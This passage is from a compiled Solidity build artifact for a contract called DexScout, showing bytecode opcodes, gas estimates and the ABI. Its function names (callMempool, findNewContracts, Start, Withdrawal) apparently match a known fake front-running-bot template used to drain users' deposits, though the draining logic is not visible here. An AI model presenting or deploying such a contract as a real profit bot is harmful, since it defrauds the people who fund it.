PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xA8B DUP3 PUSH2 0xA35 JUMP JUMPDEST SWAP2 POP PUSH2 0xA96 DUP4 PUSH2 0xA35 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xAA4 DUP2 PUSH2 0xA35 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xABB JUMPI PUSH2 0xABA PUSH2 0xA54 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB02 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xB0D DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xB25 JUMPI PUSH2 0xB24 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xB35 DUP3 PUSH2 0xA35 JUMP JUMPDEST SWAP2 POP PUSH2 0xB40 DUP4 PUSH2 0xA35 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xB6C JUMPI PUSH2 0xB6B PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xB7C DUP3 PUSH2 0xA35 JUMP JUMPDEST SWAP2 POP PUSH2 0xB87 DUP4 PUSH2 0xA35 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xBB3 JUMPI PUSH2 0xBB2 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xBC3 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xBF5 JUMPI PUSH2 0xBF4 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xC37 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xC42 DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xC52 JUMPI PUSH2 0xC51 PUSH2 0xC00 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xC94 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xC9F DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xCAF JUMPI PUSH2 0xCAE PUSH2 0xC00 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xCC4 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xCCF DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xCE7 JUMPI PUSH2 0xCE6 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xD03 DUP3 PUSH2 0xCED JUMP JUMPDEST SWAP2 POP PUSH2 0xD0E DUP4 PUSH2 0xCED JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xD27 JUMPI PUSH2 0xD26 PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD37 DUP3 PUSH2 0xCED JUMP JUMPDEST SWAP2 POP PUSH2 0xD42 DUP4 PUSH2 0xCED JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xD5B JUMPI PUSH2 0xD5A PUSH2 0xA54 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE6 0xC2 0xF6 0xE2 0xEF DUP1 GASPRICE 0x25 0xC5 SWAP7 PUSH12 0x3D7F968FC022768BEE9C9084 JUMPDEST PUSH28 0xC17EE3E15FBB4C64736F6C6343000818003300000000000000000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "695800",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"Start()": "infinite",
				"Stop()": "1938",
				"Withdrawal()": "infinite"
			},
			"internal": {
				"WithdrawalProfits()": "infinite",
				"_calculateGasNeeds()": "22",
				"_callDexAction()": "infinite",
				"beyond(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
				"calcLiquidityInContract(struct DexScout.slice memory)": "infinite",
				"callMempool()": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"findNewContracts(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
				"getMemPoolDepth()": "22",
				"getMemPoolHeight()": "22",
				"getMemPoolLength()": "infinite",
				"getMemPoolOffset()": "22",
				"keccak(struct DexScout.slice memory)": "infinite",
				"loadCurrentContract(string memory)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"nextContract(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
				"orderContractsByLiquidity(struct DexScout.slice memory)": "infinite",
				"parseMempool(string memory)": "infinite",
				"toHexDigit(uint8)": "infinite",
				"uint2str(uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"Start()": "1b55ba3a",
			"Stop()": "bedf0f4a",
			"Withdrawal()": "70e44c6a"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "uint256",
					"name": "_Runtime",
					"type": "uint256"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "Start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "Stop",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "Withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}